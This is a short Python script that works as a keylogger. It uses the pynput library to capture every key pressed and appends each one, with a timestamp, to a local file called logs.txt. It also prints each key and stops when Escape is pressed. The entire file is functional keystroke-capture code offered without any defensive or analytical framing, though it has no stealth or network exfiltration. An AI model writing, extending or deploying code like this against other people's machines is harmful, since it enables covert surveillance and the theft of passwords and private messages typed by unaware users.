import os
import time
from datetime import datetime 
from pynput import keyboard
import pyperclip
from threading import Thread


log_file = "logs.txt"

def on_press(key):
    if key == keyboard.Key.esc:
        print("escape")
        return False  
    
    keyPressed = returnKeyType(key)
    with open(log_file, "a") as keyLogs:
        keyLogs.write(parseOutput(keyPressed))

def returnKeyType(key):
    try:
        keyPressed = key.char
    except AttributeError:
        keyPressed = key.name
    if keyPressed == "esc":
        return False
    return keyPressed

def parseOutput(keyPressed):
    keyPressed = keyPressed
    currTime = datetime.now()
    currTimeString = currTime.strftime("%H:%M:%S %d-%m-%Y")
    keyPressed = keyPressed + "     " + currTimeString + "\n"
    print(keyPressed)
    return keyPressed




if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start() 
    listener.join()  

